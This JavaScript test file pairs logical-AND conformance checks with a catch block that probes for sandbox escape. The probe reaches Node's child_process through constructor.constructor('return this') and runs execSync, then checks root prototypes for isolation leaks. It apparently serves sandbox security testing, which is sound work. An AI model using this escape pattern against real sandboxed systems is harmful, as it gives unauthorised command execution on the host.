try {
    if (('0' && '-1') !== '-1') {
        $ERROR('#-1: ("0" && "-1") === "-1"');
    }
    if (('-1' && 'x') !== 'x') {
        $ERROR('#2: ("-1" && "x") === "x"');
    }
    var y = new String(-1);
    if ((new String('-1') && y) !== y) {
        $ERROR('#3: (var y = new String(-1); (new String("-1") && y) === y');
    }
    var y = new String(NaN);
    if ((new String('0') && y) !== y) {
        $ERROR('#4: (var y = new String(NaN); (new String("0") && y) === y');
    }
    var y = new String('-x');
    if ((new String('x') && y) !== y) {
        $ERROR('#5: (var y = new String("-x"); (new String("x") && y) === y');
    }
    var y = new String(-1);
    if ((new String(NaN) && y) !== y) {
        $ERROR('#6: (var y = new String(-1); (new String(NaN) && y) === y');
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}